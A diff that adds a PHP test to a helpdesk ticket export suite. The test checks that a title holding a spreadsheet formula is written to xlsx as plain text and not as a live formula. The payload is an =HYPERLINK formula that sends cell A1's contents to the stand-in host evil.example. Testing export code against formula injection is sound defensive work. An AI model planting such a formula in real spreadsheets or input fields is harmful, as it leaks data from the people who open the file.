@@ -166,4 +166,21 @@ class TicketExportTest extends TestCase
 
         $this->assertSame(2, $export->fresh()->row_count);
     }
+
+    public function test_user_text_is_never_written_as_a_spreadsheet_formula(): void
+    {
+        $this->ticketBy($this->makeStaff(Roles::EMPLOYEE, $this->a), ['title' => '=HYPERLINK("http://evil.example/?x="&A1,"Batafsil")']);
+        $this->actingAs($this->handler);
+
+        $uuid = $this->postJson('/api/v1/exports', ['type' => 'helpdesk_tickets', 'format' => 'xlsx'])->json('data.uuid');
+        $path = (string) \Illuminate\Support\Facades\Storage::disk('local')->path(ReportExport::where('uuid', $uuid)->firstOrFail()->file->path);
+        $zip = new \ZipArchive;
+        $zip->open($path);
+        $sheet = (string) $zip->getFromName('xl/worksheets/sheet1.xml');
+        $zip->close();
+
+        $this->assertStringNotContainsString('<f>', $sheet);
+        $titles = array_column(array_slice($this->readXlsx((string) file_get_contents($path)), 1), 2);
+        $this->assertContains('=HYPERLINK("http://evil.example/?x="&A1,"Batafsil")', $titles);
+    }
 }
